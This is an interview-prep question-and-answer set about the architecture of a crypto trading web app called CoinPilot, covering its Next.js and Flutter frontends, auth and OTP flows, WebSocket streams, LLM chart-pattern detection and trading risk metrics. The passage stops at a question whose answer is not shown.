# CoinPilot — Tough Interviewer Question Set + Answers
> Level: Advanced → Micro | Feature-wise | Frontend + Backend | Page by Page

---

## SECTION 1 — PROJECT ARCHITECTURE

---

**ADV-1.** This project uses both Next.js and Flutter Web. Explain exactly why two separate frontends were chosen. What does each one own? What would break if you merged them into one?

**A:** Next.js owns the public-facing layer: landing page, SEO meta tags, blog, and all auth pages (`/auth/*`). It is server-rendered so search engines can index it. Flutter Web owns the authenticated dashboard: charts, AI analysis, order book, sentiment, trade journal, etc. Flutter cannot be crawled by search engines and has a large JS bundle — unsuitable for a landing page. If merged into one, you would either lose SEO (Flutter-only) or lose the rich interactive trading UI (Next.js-only). The two are joined at `/app/` — Next.js serves Flutter's static build from its `public/app/` folder, and the rewrite rule `/app/:path* → /app/index.html` hands off routing to Flutter's GoRouter.

---

**ADV-2.** The dev proxy (`dev-proxy.js`) runs on port 8080 and routes to three different servers. Why not just use Next.js rewrites for everything? What specific problem does the proxy solve that Next.js rewrites cannot?

**A:** Next.js rewrites work for HTTP but cannot handle WebSocket upgrades needed by Socket.IO. The dev proxy handles `server.on('upgrade', ...)` for WebSocket connections, forwarding Socket.IO traffic to the backend. Additionally, Next.js rewrites run inside the Next.js process and cannot proxy to Flutter's dev server for hot-reload. The proxy also mirrors the production Nginx config exactly — same routing rules — so behaviour in dev matches production. Next.js rewrites also can't distinguish Flutter asset requests by `Referer` header, which the proxy does.

---

**ADV-3.** In production, traffic flows through Nginx. Draw the full request path from a user typing `coinastra.site/dashboard` to Flutter rendering a chart.

**A:**
```
User browser → DNS → Server IP:443
→ Nginx (SSL termination, port 443)
→ matches location ~ ^/(dashboard|...) 
→ proxy_pass http://flutter:5000
→ Flutter nginx container serves index.html (base-href /)
→ Browser loads Flutter JS (main.dart.js, canvaskit)
→ Flutter GoRouter parses /dashboard route
→ AppShell + DashboardScreen renders
→ ChartsNotifier calls GET /api/v1/dashboard/klines
→ Nginx routes /api/v1/* → proxy_pass http://nextjs:3000 (NO — direct backend)
   Actually: Flutter calls backend URL directly (EndPoints.baseUrl = prod backend)
→ crypto-backend-4557.onrender.com responds with candle data
→ Flutter renders candlestick chart
```

---

**MID-4.** What is the difference between `NEXT_PUBLIC_FLUTTER_DASHBOARD_URL` and `FLUTTER_APP_URL`?

**A:** `NEXT_PUBLIC_FLUTTER_DASHBOARD_URL` is a client-side variable (prefixed `NEXT_PUBLIC_`) embedded in the browser bundle. It is used by Next.js pages to redirect the user's browser to the Flutter dashboard after login. `FLUTTER_APP_URL` is a server-side variable used by Next.js API routes (Node.js process) to make server-to-server calls to the Flutter app container — for example, health checks or proxying. The `NEXT_PUBLIC_` prefix is Next.js's mechanism to expose env vars to the browser; without it, the variable is undefined client-side.

---

**MID-5.** What is the `--base-href /app/` flag doing? What breaks if you build Flutter with `--base-href /`?

**A:** `--base-href /app/` sets the `<base href="/app/">` tag in Flutter's `index.html`. This tells the browser to resolve all relative asset paths (JS, fonts, canvaskit WASM) relative to `/app/`. If you use `--base-href /`, assets are requested from the root `/`, so `main.dart.js` is requested at `/main.dart.js` instead of `/app/main.dart.js`. Since Next.js serves Flutter assets only under `/app/`, all asset requests return 404. The app loads a blank white screen with console errors.

---

**MICRO-6.** What does the rewrite `{ source: "/app/:path*", destination: "/app/index.html" }` do? Why is it needed?

**A:** Flutter is a Single Page Application — GoRouter handles all routing client-side. When a user directly navigates to `/app/dashboard` or refreshes the page, the server has no file at that path. Without the rewrite, Next.js returns a 404. This rule rewrites all `/app/*` requests to `/app/index.html`, which loads Flutter's JavaScript. Flutter then reads `window.location` and GoRouter renders the correct screen. This is the standard SPA fallback pattern.

---

**MICRO-7.** Full forms:

**A:**
- **SPA** — Single Page Application
- **OHLCV** — Open, High, Low, Close, Volume
- **CORS** — Cross-Origin Resource Sharing
- **JWT** — JSON Web Token
- **OTP** — One-Time Password
- **RSI** — Relative Strength Index
- **MACD** — Moving Average Convergence Divergence
- **EMA** — Exponential Moving Average
- **ATH** — All-Time High
- **ATL** — All-Time Low
- **RR** — Risk/Reward (ratio)

---

## SECTION 2 — AUTH FLOW (Next.js)

---

**ADV-8.** Walk through the complete forgot-password flow end to end.

**A:**
1. User enters email on `/auth/forgot-password` → `POST /api/auth/forgot-password` → Next.js proxies to `POST /api/v1/auth/forgot-password` with `{ email }` → backend generates OTP, saves to DB, emails it to user.
2. User sees "Sent successfully" state with a button → clicks "Enter OTP" → navigates to `/auth/verify-otp?email=...&type=password_reset`.
3. User enters 6-digit code → `POST /api/auth/verify-otp` → Next.js strips `type`, forwards `{ email, otp }` to `POST /api/v1/auth/verify-otp` → backend checks OTP, sets `otpVerified = true` in DB for that user, returns success.
4. Flutter redirects to `/auth/reset-password?email=...` (no OTP in URL).
5. User sets new password → `POST /api/auth/reset-password` → forwards `{ email, password }` to `POST /api/v1/auth/reset-password` → backend checks `otpVerified === true` for that user, updates password, clears flag.

`otpVerified = true` means the backend has cryptographically confirmed the user owns the email. The reset endpoint trusts this flag instead of requiring the OTP again.

---

**ADV-9.** Why does the `verify-otp` Next.js route strip `type` before forwarding?

**A:** The Flutter client sends `{ email, otp, type }` where `type` is `"password_reset"` or `"email_verification"` — a frontend-only routing concept. The backend's `POST /api/v1/auth/verify-otp` only expects `{ email, otp }`. If `type` were forwarded, the backend's validation middleware (Joi/Zod) would reject the request with a 400 "unknown field" error if it uses `strict()` mode. Stripping it in the Next.js route (`const { email, otp } = await req.json()`) ensures only the required fields are sent regardless of what the client adds.

---

**ADV-10.** Tokens are stored via `setTokens()`. Where exactly? What XSS risk?

**A:** Tokens are stored in `localStorage` under keys `coinastra_access` and `coinastra_refresh` (written by `setTokens()` in `lib/auth.ts`) and also in `SharedPreferences` for Flutter Web (synced via the auth provider). `localStorage` is accessible by any JavaScript running on the page. If an attacker injects malicious JS via XSS (e.g., through an unsanitised user input, a compromised npm package, or a markdown renderer), they can call `localStorage.getItem('coinastra_access')` and steal the token. `httpOnly` cookies cannot be read by JS at all — the browser sends them automatically with requests but they are invisible to `document.cookie`. The mitigation is `httpOnly; Secure; SameSite=Strict` cookies, which this app does not currently use.

---

**MID-11.** After OTP verification for `password_reset`, why is OTP NOT passed in the URL?

**A:** Previously, the flow was `/auth/reset-password?email=...&otp=...`, passing the OTP in the URL. This is a security issue: URLs appear in browser history, server logs, and `Referer` headers — all of which could leak the OTP. The new flow relies on the backend's `otpVerified` flag instead. After successful OTP verification, the backend marks the user's record. The reset-password endpoint then checks this flag server-side. The URL only carries `email` as a convenience (pre-fills the form), not any secret credential.

---

**MID-12.** The resend-OTP endpoint only sends `{ email }`. Risk of removing `purpose`?

**A:** If the backend uses `purpose` to determine which OTP template to send (e.g., "Reset your password" vs "Verify your email"), removing it means the backend must infer purpose from context, or it always sends the same email regardless. If a user who is in the middle of email verification calls resend, they might receive a "reset password" email, which is confusing. The risk is if the backend has strict validation requiring `purpose` — in that case the endpoint would return 400. The current approach works only if the backend can identify the OTP purpose from the user's current state in the database.

---

**MID-13.** The "Sent successfully" message appears before the user actually resends. Is this correct UX?

**A:** No, it is the initial state shown after the first OTP is sent (from the forgot-password form). The message communicates that the OTP was already sent, not that a resend was triggered. The "Resend" button below triggers a new send. A better UX would show the success message only after clicking Resend — with a toast or inline confirmation like "Code resent!" — so the user knows the action completed. The current implementation is technically functional but the static message can be misleading.

---

**MICRO-14.** What was wrong with the old `reset-password` body `{ email, otp, newPassword }`?

**A:** The backend's new API spec for `POST /api/v1/auth/reset-password` only accepts `{ email, password }`. The old body had two problems: (1) field name mismatch — backend expects `password`, not `newPassword`; (2) `otp` is no longer required because the backend uses the `otpVerified` flag instead. Sending extra fields could cause validation failure if the backend uses strict schema validation.

---

**MICRO-15.** What does `NEXTAUTH_SECRET` do? Is NextAuth actually used here?

**A:** `NEXTAUTH_SECRET` is required by the `next-auth` package to sign and encrypt session tokens. However, in this project, authentication is custom — JWTs are managed manually via the backend's `/api/v1/auth/*` endpoints, not through NextAuth's session system. `NEXTAUTH_SECRET` is present likely as a leftover from an earlier scaffold or because `next-auth` is in `package.json` and throws a warning without it. The actual auth flow does not use NextAuth sessions or providers.

---

## SECTION 3 — CHARTS SCREEN (Flutter)

---

**ADV-16.** Explain the dual-stream architecture in `ChartsNotifier`.

**A:** The primary stream is `klineStream` — Socket.IO events emitted by the backend specifically for candlestick updates (`market:kline`). Each tick contains `openTime, open, high, low, close, volume` for the active symbol and interval. The fallback is `tickerStream` — the dashboard's 24hr ticker stream that is always active. If the backend doesn't emit kline events (e.g., the market:kline event is not implemented), `_updateCandleFromTicker()` updates only `close`, `high`, `low` of the latest candle from the ticker price. This ensures the latest candle always reflects live price even if dedicated kline streaming is unavailable.

---

**ADV-17.** Race condition risk when switching coins quickly during `_fetchPattern()`?

**A:** Yes. If the user switches BTC → ETH → SOL rapidly, three `loadCandles()` calls fire. Each completes and calls `_fetchPattern()` asynchronously. The pattern results arrive out of order — the BTC pattern result could overwrite the SOL result. Fix: capture the current coin/timeframe at the start of `_fetchPattern()` and check before writing: `if (_selectedCoin != capturedCoin) return;`. This is a "stale closure" guard. Alternatively, use a cancellation token or increment a request counter and only apply results from the latest request.

---

**ADV-18.** Exact enforcement logic in `toggleAiOverlayActive()` for minimum 4H timeframe?

**A:** `_timeframeOrder = ['1m', '5m', '15m', '1H', '4H', '1D', '1W']`, `_minAiTfIndex = 4` (index of `'4H'`). When AI overlay is toggled ON:
1. `idx = _timeframeOrder.indexOf(_timeframe)` — finds current timeframe's position.
2. If `idx < 4` (i.e., `1m`, `5m`, `15m`, `1H`) → sets `_timeframe = '4H'`, calls `loadCandles()` which calls `_fetchPattern()` after success.
3. If `idx >= 4` (i.e., `4H`, `1D`, `1W`) → candles already loaded at valid timeframe, calls `_fetchPattern()` directly.
When toggled OFF: clears `_patternResult` and `_patternError`.

---

**MID-19.** Why does exactly 1 candle cause a crash?

**A:** The `candlesticks` package asserts `candles.length == 0 || candles.length > 1`. You need 0 candles (shows empty state) or 2+ candles (renders the chart with relative positioning). With exactly 1 candle, the chart cannot draw relative price movement or x-axis scale — there is no "previous" candle to compare against. This edge case occurs when the backend returns only 1 row (e.g., a newly listed coin with minimal history, or the first candle of a new interval that just opened at that exact moment).

---

**MID-20.** `_onKlineTick()` — three branches explained.

**A:**
- `tick.openTime == dateMs`: Same candle is still open — update its high/low/close/volume in place. The current candle is being updated with the latest prices.
- `tick.openTime > dateMs`: A new candle has opened (the previous interval closed). Insert the new candle at index 0 (newest first), remove the last candle if over 100 to keep a fixed window.
- `tick.openTime < dateMs` (implicit else): The tick is older than the current candle — this is a late/duplicate/out-of-order message. Ignore it silently to avoid corrupting the chart.

---

**MID-21.** Why is AI overlay incompatible with Line chart?

**A:** The AI overlay draws pattern information as a floating card on top of the chart. The overlay shows pattern name, probability, target, and stop-loss — all of which are derived from candlestick (OHLCV) pattern analysis. A Line chart only shows closing prices, not open/high/low data. Displaying "Bull Flag" or "Head & Shoulders" overlay on a line chart is misleading because those patterns are defined by candlestick body/wick relationships that are invisible in a line chart. Architecturally, `setChartType('Line')` now also sets `_aiOverlayActive = false` and clears pattern data.

---

**MID-22.** What does the backend return if Groq fails to detect a pattern?

**A:** The backend returns `{ success: false, message: "...", ... }` on failure. In `_fetchPattern()`, the check `raw['success'] == true` fails, and `_patternError = 'Analysis unavailable'` is set. The overlay then shows a warning icon + error text. There is a risk: if the backend returns `{ success: true, data: null }`, the code does `PatternResult.fromJson(null)` which throws a null cast error. This should be guarded with `if (raw['data'] != null)`.

---

**MICRO-23.** Why does Flutter use uppercase timeframes (`1H`, `4H`) internally?

**A:** The UI display labels use uppercase for readability (`1H` looks cleaner than `1h` in a button). The Binance API and this backend accept lowercase intervals (`1h`, `4h`). The `_mapTimeframe()` function acts as a translation layer between the display format and the API format. Both `loadCandles()` and `_fetchPattern()` now call `_mapTimeframe()` before sending to the backend.

---

**MICRO-24.** The 6 fields in each candle map sent to detect-pattern.

**A:**
```dart
{
  'timestamp': int,   // Unix ms (c.date.millisecondsSinceEpoch)
  'open':      double, // opening price of the candle
  'high':      double, // highest price during the interval
  'low':       double, // lowest price during the interval
  'close':     double, // closing price of the candle
  'volume':    double, // total trading volume during the interval
}
```
`timestamp` is in **milliseconds** since Unix epoch (January 1, 1970 UTC).

---

**MICRO-25.** Full form of OHLCV.

**A:** **O**pen — **H**igh — **L**ow — **C**lose — **V**olume. Open: price at the start of the interval. High: highest price reached. Low: lowest price reached. Close: price at the end of the interval. Volume: total amount of asset traded during the interval.

---

## SECTION 4 — PATTERN DETECTION API

---

**ADV-26.** Limitations of using an LLM for real-time pattern detection. 3 failure modes.

**A:**
1. **Hallucination**: The LLM may confidently name a pattern ("Inverted Head & Shoulders") that does not actually exist in the data. It has no strict mathematical constraint to verify its claim.
2. **Latency**: Groq is fast but still 1–3 seconds per request. Real traders need sub-100ms decisions. An LLM cannot be used for HFT or even moderate-frequency trading signals.
3. **Non-determinism**: Same candle data sent twice may return different pattern names or probabilities. This makes backtesting and reliability analysis impossible — you can't reproduce results consistently.
Rule-based algorithms (e.g., detecting a Bull Flag: +15% move, then <5% range consolidation for 5 candles, volume declining) are deterministic and verifiable.

---

**ADV-27.** Is 100 candles at 4H enough for pattern detection?

**A:** 100 candles × 4H = 400 hours ≈ 16 days of data. This is sufficient for: Bull/Bear Flag (needs 10–20 candles), Cup and Handle (needs 30–50 candles), Double Top/Bottom (needs 20–40 candles). However it is insufficient for: Head & Shoulders on a weekly timeframe, multi-month accumulation patterns, Elliott Wave full cycle analysis (5 waves + 3 correction = needs 50–200 significant swings). For reliable macro pattern detection, 200+ candles on daily timeframe (6+ months) is recommended.

---

**MID-28.** Why was Flutter sending uppercase `1H` originally? What layer should have caught the mismatch?

**A:** Flutter used uppercase internally for display consistency. The `_mapTimeframe()` function existed to convert for the klines endpoint but was not called in `_fetchPattern()`. The mismatch should have been caught at the API contract level — either via OpenAPI spec validation, or by the backend returning a clear 400 error (which it did: `"timeframe" must be one of [1m, 3m, 5m...]`). The backend's Joi validation did its job. The fix was to apply the same `_mapTimeframe()` call before the POST body is constructed.

---

**MID-29.** Which response fields does the Flutter overlay currently display vs ignore?

**A:**
- **Displayed**: `pattern`, `probability`, `target`, `stopLoss`, `volumeConfirmation`
- **Ignored**: `patternType` (continuation/reversal), `riskRewardRatio`, `description`, `confidence`, `keyLevels.support`, `keyLevels.resistance`, `candlesAnalyzed`, `model`, `usage`, `generatedAt`, `currentPrice`

The `description` and `confidence` fields would add significant value to the overlay and should be displayed. `riskRewardRatio` is pre-calculated and should replace the manual formula.

---

**MICRO-30.** What is the `usage` object in the response?

**A:** It is the Groq API token consumption for that request: `prompt_tokens` (input), `completion_tokens` (output), `total_tokens` (sum). This is returned by the Groq SDK and passed through the response. It is used for cost monitoring — Groq charges per million tokens. At ~3319 tokens per request and 1000 users, that's 3.3M tokens per batch. The backend developer should log and alert on token usage to prevent unexpected costs.

---

**MICRO-31.** `patternType`: "continuation" vs "reversal" — what visual change would help?

**A:** Show a directional arrow badge:
- **Continuation** (e.g., Bull Flag) → green upward arrow + "Trend continues"
- **Reversal** (e.g., Head & Shoulders) → red downward arrow + "Trend reversing"
Color the overlay border green for continuation, red for reversal. This communicates the pattern's market implication at a glance without requiring the user to know what "Bull Flag" means.

---

## SECTION 5 — DASHBOARD (Flutter)

---

**ADV-32.** Full Socket.IO connection lifecycle.

**A:**
1. **connect**: `DashboardSocket.instance.connect()` → `io(EndPoints.socketUrl, SocketOptions)` → HTTP upgrade handshake to WebSocket.
2. **subscribe**: After `connect` event fires, emits `subscribe` with `{ symbol: 'BTCUSDT', interval: '4h' }` via `subscribeWithInterval()`.
3. **receive ticks**: Backend emits `market:ticker` (24hr price data) continuously and `market:kline` for candlestick updates. Flutter `klineStream` and `tickerStream` controllers forward these to all listeners.
4. **reconnect on drop**: Socket.IO client has built-in reconnection with exponential backoff. On reconnect, `subscribeWithInterval()` is called again to re-subscribe because the server loses subscription state on disconnect.

---

**ADV-33.** Risks of singleton WebSocket in Flutter Web.

**A:**
1. **Memory leak**: If `dispose()` is never called on the socket, subscriptions accumulate across page navigations.
2. **Stale subscriptions**: If the user was viewing BTC and navigates away, the socket still receives BTC ticks. Without proper cleanup, those ticks fire into disposed notifiers, causing "setState() called after dispose()" errors.
3. **Reconnection state**: On browser tab visibility change (tab hidden), some browsers throttle or close WebSockets. The singleton must handle `visibilitychange` events to reconnect.
4. **Single point of failure**: All real-time data flows through one connection. If it drops, all live data stops simultaneously.

---

**MID-34.** How a socket price update flows to the chart header price badge.

**A:**
1. Socket emits `market:ticker` → `DashboardSocket._tickerController.add(tickers)` → `tickerStream` fires.
2. `chartsProvider` listens to `tickerStream` in `_initSocketListener()`.
3. `_tickerSubscription` matches `BTCUSDT` in tickers → calls `_updateCandleFromTicker(price)`.
4. `_updateCandleFromTicker` updates `_candles[0].close` → calls `notifyListeners()`.
5. `_ChartHeader` watches `tickerProvider` directly (separate provider) → `livePrice` updates.
6. The price badge `Text(livePrice...)` rebuilds with the new price.
Two paths: candle update (via chartsProvider) + price badge update (via tickerProvider directly).

---

**MID-35.** Fear & Greed Index — what it is, range, classifications.

**A:** A composite market sentiment indicator published daily by Alternative.me. Range: **0–100**.
- 0–24: Extreme Fear
- 25–44: Fear
- 45–55: Neutral
- 56–74: Greed
- 75–100: Extreme Greed

High greed = market is overbought, potential correction coming (contrarian sell signal). Extreme fear = potential buying opportunity. It aggregates: volatility (25%), market momentum/volume (25%), social media (15%), surveys (15%), Bitcoin dominance (10%), Google Trends (10%).

---

**MICRO-36.** `ticker24hr` vs `klines` — when to use each?

**A:** `ticker24hr` returns a snapshot: current price, 24h change%, 24h volume, 24h high/low. Use it for displaying live price, price change badges, and market overview. `klines` returns historical OHLCV data in array format for a given interval and limit. Use it for rendering candlestick/line charts. `ticker24hr` is cheaper (one row) and updates in real-time via WebSocket. `klines` requires a REST call with a specified interval and is used for historical chart rendering.

---

## SECTION 6 — TRADE NOW / AI ANALYSIS

---

**ADV-37.** Which Trade Now API calls could be parallelized with `Future.wait`?

**A:** The following are independent (no data dependency between them):
- `analysisSignal` — AI trade signal
- `analysisSentiment` — social/market sentiment
- `analysisOpenInterest` — OI data
- `analysisLongShort` — long/short ratio
- `analysisLiquidations` — liquidation data

All can be parallelized: `Future.wait([fetchSignal(), fetchSentiment(), fetchOI(), fetchLongShort(), fetchLiquidations()])`. Currently if they run sequentially and each takes 500ms, total load time = 2.5s. In parallel, total = max(500ms) = 500ms. The `analysisHistory` may depend on signal data and should be sequential.

---

**ADV-38.** What inputs does `analysisSignal` likely use vs `detect-pattern`?

**A:** `analysisSignal` is a holistic trade signal generator. It likely combines: current price action, RSI/MACD values, funding rate (positive = longs paying = overheated), long/short ratio, fear/greed score, recent news sentiment, and on-chain metrics. It returns a directional signal (BUY/SELL/HOLD) with confidence. `detect-pattern` is purely technical — it only analyses candlestick geometry to identify a named chart pattern. Signal = broad market context. Pattern = price structure only.

---

**MID-39.** Open Interest vs Long/Short ratio — difference.

**A:** **Open Interest (OI)**: Total number of outstanding futures contracts that have not been settled. Rising OI = new money entering the market (conviction). Falling OI = positions closing (conviction leaving). **Long/Short ratio**: Percentage of accounts holding long vs short positions. 70% long / 30% short means most traders are betting on price increase. This is contrarian at extremes — if 90% are long, there are few buyers left, so the price is more likely to drop (long squeeze). High OI + high long ratio = crowded trade = high squeeze risk = bearish signal despite bullish positioning.

---

**MID-40.** How liquidations data informs a trade signal. What is a liquidation cascade?

**A:** Liquidations occur when a leveraged position's margin falls below the maintenance margin — the exchange force-closes the position. Large liquidation clusters at certain price levels act as price magnets — market makers push price into these levels to "hunt" liquidations. A **liquidation cascade**: price drops → long positions liquidated → forced selling → price drops further → more liquidations → self-reinforcing crash. Knowing where $50M in liquidations are clustered at $94,000 BTC means that level will likely be tested. The signal engine uses liquidation heatmap data to identify these levels.

---

**MICRO-41.** Full form and definition of OI.

**A:** **OI = Open Interest**. The total number of active/outstanding derivative contracts (futures or options) that have not been settled, expired, or closed. It measures market participation. OI is a futures/derivatives market metric — it does not exist in spot markets because spot trades settle immediately. Rising OI with rising price = strong bullish trend. Rising OI with falling price = strong bearish trend.

---

## SECTION 7 — MARKET MEMORY

---

**ADV-42.** Difference between memory patterns and real-time pattern detection.

**A:** `GET /api/v1/memory/patterns` retrieves **historical** patterns from MongoDB — past instances where similar market conditions occurred and what the outcome was. It is a backlook: "In the past 30 days, BTC showed a Consolidation Squeeze 3 times, and 2 of those resulted in +4-8% moves within 48 hours." This informs probability based on history. `POST /api/v1/charts/detect-pattern` analyzes **current** candles in real-time to identify what pattern is forming right now. Use memory for context and base-rate probability; use detect-pattern for current structure identification.

---

**ADV-43.** Performance implications of 1000-day lookback.

**A:** 1000 days × multiple pattern evaluations per day = potentially 50,000–100,000 MongoDB documents to scan. Without proper indexing (`symbol`, `date`, composite index), this is a full collection scan — O(n) with n potentially millions of records. The backend should: (1) have a compound index on `{ symbol: 1, date: -1 }`, (2) use MongoDB aggregation pipeline with `$match` first to reduce dataset before processing, (3) implement result caching with Redis (TTL 1 hour for lookback > 90 days), (4) paginate results instead of returning all at once.

---

**MID-44.** How is `similarity` calculated? What algorithm?

**A:** Pattern similarity is typically computed using one of: (1) **DTW (Dynamic Time Warping)** — measures similarity between two time series of different lengths/speeds. Better than Euclidean distance for financial data. (2) **Pearson correlation coefficient** — normalizes both series and measures linear correlation. (3) **Cosine similarity** on price vectors — treats each candle series as a vector and measures the angle between them. The backend likely normalizes the OHLCV series (e.g., percentage changes from start) then computes similarity between current window and historical windows, returning the top matches with their similarity score.

---

**MID-45.** How does the backend know an outcome was "reached"? Pre-computed or at request time?

**A:** This is almost certainly **pre-computed** and stored in MongoDB. At request time, computing outcome for each historical pattern (fetching subsequent price data, evaluating if target was hit) would be extremely slow. Instead, a background job (cron) runs periodically: for each stored pattern entry, it checks if the pattern's predicted target was reached within the prediction window (e.g., 7 days) using stored price history, then updates the `outcome` field in MongoDB. At request time, the API simply queries and returns the pre-computed outcomes.

---

**MICRO-46.** `memorySimilarEvents`, `memoryMarketCycles`, `memoryMacroContext` — differences.

**A:**
- **`memorySimilarEvents`**: Returns past periods where price action was structurally similar to now (e.g., "Similar to March 2020 bottom"). Uses pattern matching against historical data.
- **`memoryMarketCycles`**: Identifies where in the market cycle BTC currently is (accumulation → markup → distribution → markdown). Uses long-term on-chain and price metrics.
- **`memoryMacroContext`**: Adds external macro context — Fed rate decisions, inflation data, correlation with S&P 500, DXY. Provides "the macro backdrop that surrounded similar past events."
- **`memoryPatterns`**: Technical pattern occurrences only (chart patterns like consolidation squeeze, oversold accumulation) with their outcomes.

---

## SECTION 8 — SENTIMENT

---

**ADV-47.** What does `longAccountPercent` actually measure? Why is it contrarian?

**A:** `longAccountPercent` from Binance Futures is the percentage of user accounts holding net long positions (not the dollar value, but the count of accounts). If 75% of accounts are long, it means 3 in 4 retail traders are bullish. This is contrarian at extremes because: when everyone who wants to buy has bought, there are no more buyers to push price higher. Any negative catalyst triggers a cascade of long liquidations. Conversely, extreme short positioning (high short accounts %) means potential for a short squeeze (shorts buy to cover → price rises). This mirrors the "dumb money" concept — retail sentiment is most wrong at extremes.

---

**ADV-48.** 5 on-chain metrics for `/api/sentiment/onchain`.

**A:**
1. **Exchange Net Flow**: Net BTC flowing into/out of exchanges. Negative flow (outflows) = holders moving to cold wallets = long-term holding signal (bullish).
2. **SOPR (Spent Output Profit Ratio)**: Are coins being moved at profit or loss? SOPR > 1 = selling at profit (potential resistance). SOPR < 1 = selling at loss (capitulation zone, potential bottom).
3. **NUPL (Net Unrealized Profit/Loss)**: What % of market cap is in profit. Extreme greed zone (>75%) = euphoria, likely top.
4. **Whale Transaction Count**: Number of transactions >$1M. Spikes often precede major moves.
5. **Hash Rate / Miner Revenue**: Miner selling pressure indicator. When miners sell heavily (revenue drops), they may be covering costs — potential downward pressure.

---

**MID-49.** Coin ID vs trading symbol — difference and conversion.

**A:** **CoinGecko ID** (`bitcoin`, `ethereum`, `solana`) is CoinGecko's internal identifier for fetching market data, metadata, and on-chain data. It is lowercase and sometimes differs from the symbol. **Trading symbol** (`BTCUSDT`, `ETHUSDT`) is the Binance/exchange pair format: base asset + quote currency. The conversion happens in different layers: CoinGecko-based data (market data, sentiment) uses coin IDs. Binance-based data (klines, order book, funding rates) uses symbols. The app must maintain a mapping: `BTC → bitcoin`, `ETH → ethereum`. In `CoinSelector`, the user selects a display symbol (`BTC`) and both formats are derived from it.

---

**MICRO-50.** Fear & Greed Index — who publishes it and inputs.

**A:** Published daily by **Alternative.me** (alternative.me/crypto/fear-and-greed-index/). Inputs: **Volatility** (25%) — current volatility vs 30/90-day average; **Market Momentum/Volume** (25%) — current volume vs 30/90-day average; **Social Media** (15%) — Twitter/Reddit hashtag volume and sentiment; **Surveys** (15%) — weekly crypto polls; **Bitcoin Dominance** (10%) — high dominance = fear (alt coins selling off to BTC); **Google Trends** (10%) — BTC search volume changes.

---

## SECTION 9 — ORDER BOOK

---

**ADV-51.** How to detect a liquidity wall from order book data.

**A:** A liquidity wall is an unusually large cluster of orders at a specific price level. Detection algorithm: (1) Compute the average order size across all levels. (2) Flag any level where order size > 3× average as a significant level. (3) If multiple consecutive price levels all have large orders, it's a wall. Visually in Flutter: render the bid/ask depth as a horizontal bar chart where bar width = order volume. A wall appears as a dramatically wider bar. Color bids green, asks red. Add a "Wall" label with the total USD value when a threshold is crossed.

---

**MID-52.** REST polling vs WebSocket for order book — trade-offs.

**A:** **REST polling**: Simple, stateless, easy to implement. Latency = polling interval (e.g., every 1s = up to 1s stale data). No persistent connection. Each poll fetches the entire order book snapshot. **WebSocket streaming**: Binance provides `@depth` stream — differential updates (only changed levels). Latency < 50ms. Requires maintaining local order book state (apply diffs). More complex: must handle out-of-order messages, reconnection, and initial snapshot sync. For a trading app where users need to see order book in real time, WebSocket is strongly preferred. REST polling at 1s intervals is acceptable for educational/overview display but not for active trading.

---

**MICRO-53.** What does the `limit` parameter do in order book endpoint?

**A:** `limit` specifies how many price levels to return on each side (bids and asks). `limit=50` returns the 50 closest bid prices below market and 50 closest ask prices above market. Increasing to `limit=500`: (1) returns deeper market context — you can see walls further from current price; (2) increases response payload size 10× (~50KB vs ~5KB); (3) backend must fetch and process more data from the exchange API. For a UI showing order book depth, 20–50 levels is sufficient. 500 levels is used for algorithmic analysis of deep liquidity.

---

## SECTION 10 — RISK MANAGER

---

**ADV-54.** Kelly Criterion and why it fails in crypto.

**A:** **Kelly Criterion**: `f = (bp - q) / b` where `b` = odds (reward/risk), `p` = probability of winning, `q` = 1 - p. It tells you what fraction of your capital to risk to maximize long-term growth. **Failures in crypto**: (1) **Unknown probabilities**: Kelly requires accurate win probability. In crypto, probabilities are estimated from backtests which overfit. A small error in `p` leads to massive overbetting. (2) **Fat tails**: Crypto has extreme events (80% drops in 24h for altcoins) that Kelly doesn't account for. Full Kelly sizing can cause ruin. (3) **Non-stationarity**: Market regimes change — a strategy with 60% win rate in bull market may have 30% in bear market. Most practitioners use **half-Kelly** or **quarter-Kelly** as a safety buffer.

---

**MID-55.** RR ratio formula and minimum acceptable value.

**A:** `RR = (Target - Entry) / (Entry - StopLoss)` for a long trade. Example: Entry $100, Target $115, Stop $95 → RR = (115-100)/(100-95) = 15/5 = 3.0. Minimum acceptable: **1:2 RR** (risk $1 to make $2). With a 50% win rate and 1:2 RR, you are profitable: `(0.5 × 2) - (0.5 × 1) = +0.5` expectancy per trade. Many professional traders require 1:3 minimum to account for slippage, fees, and the reality that win rates are often below 50%.

---

**MID-56.** Max drawdown formula and why interval matters.

**A:** **MDD = (Peak - Trough) / Peak × 100%**. The largest peak-to-trough percentage decline in a portfolio or price series during a period. Example: Peak $100, Trough $60 → MDD = 40%. **Why interval matters**: Daily (`1d`) MDD only captures daily close-to-close declines. Intraday wicks could be far larger. Hourly (`1h`) catches intraday crashes — BTC famously dropped 30% in a single hour on March 12, 2020. Using `1d` for that period would show ~40% drawdown; using `1h` would show ~50%+ intraday. Always use the finest available interval for accurate MDD calculation.

---

**MICRO-57.** Full forms: RR, MDD, ATR.

**A:**
- **RR** — Risk/Reward ratio. Measures potential profit relative to potential loss on a trade.
- **MDD** — Maximum Drawdown. The largest peak-to-trough decline. Measures strategy/portfolio risk.
- **ATR** — Average True Range. Measures market volatility over N periods. True Range = max(High-Low, |High-PrevClose|, |Low-PrevClose|). ATR = average of TR over N periods (typically 14). Higher ATR = more volatile. Used to set dynamic stop-losses.

---

## SECTION 11 — TRADE JOURNAL

---

**ADV-58.** MongoDB schema for a trade journal entry. Win rate and profit factor formulas.

**A:**
```json
{
  "_id": "ObjectId",
  "userId": "ObjectId",
  "symbol": "BTCUSDT",
  "direction": "LONG | SHORT",
  "entryPrice": 95000.0,
  "exitPrice": 98500.0,
  "quantity": 0.1,
  "entryTime": "ISODate",
  "exitTime": "ISODate",
  "stopLoss": 93000.0,
  "takeProfit": 100000.0,
  "pnl": 350.0,
  "pnlPercent": 3.68,
  "fees": 4.75,
  "strategy": "Bull Flag breakout",
  "notes": "Strong volume on breakout candle",
  "tags": ["breakout", "trend-following"],
  "screenshots": ["url1"],
  "status": "CLOSED | OPEN",
  "createdAt": "ISODate"
}
```
**Win Rate** = (Winning trades / Total closed trades) × 100.
**Profit Factor** = Sum of all winning trade PnL / |Sum of all losing trade PnL|. Value > 1 = profitable. Value = 1 = break even.

---

**MID-59.** Hard delete vs soft delete for journal entries.

